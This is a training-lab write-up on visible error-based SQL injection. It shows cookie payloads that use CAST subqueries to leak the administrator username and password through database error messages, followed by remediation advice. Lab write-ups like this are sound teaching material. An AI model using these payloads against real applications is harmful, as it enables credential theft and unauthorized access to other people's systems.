# Visible error-based SQL injection

## 1. Vulnerability

**Visible Error-Based SQL Injection**

The application exposes verbose database errors that reveal information about the underlying SQL query. These errors can be manipulated to leak database values.

## 2. Objective

Use the verbose error message to retrieve the `administrator` password and log in.

## 3. Exploitation

1. Find the `TrackingId` cookie in the request and send it to Burp Repeater.

2. Add a single quote and observe the verbose SQL error.

3. Add `--` to comment out the remaining query:

`TrackingId=ogAZZfxtOKUELbuJ'--`

4. Confirm that the query is syntactically valid.

5. Inject a `CAST()` subquery:

`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`

6. Modify the subquery to retrieve the username:

`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`

7. The database error reveals the username `administrator`.

8. Replace `username` with `password`:

`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

9. The error message leaks the password.

10. Use the password to log in as `administrator`.

11. Lab solved.

## 4. Impact

Verbose SQL errors can allow attackers to:

* Extract sensitive database information.
* Discover database structure.
* Leak usernames and passwords.
* Develop further SQL injection attacks.

## 5. Remediation

* Use **parameterized queries / prepared statements**.
* Never expose raw database errors to users.
* Return generic error messages.
* Log detailed errors only on the server side.

## 6. Key Takeaway

**Detailed database errors can turn a SQL injection vulnerability into a direct data-extraction mechanism.**
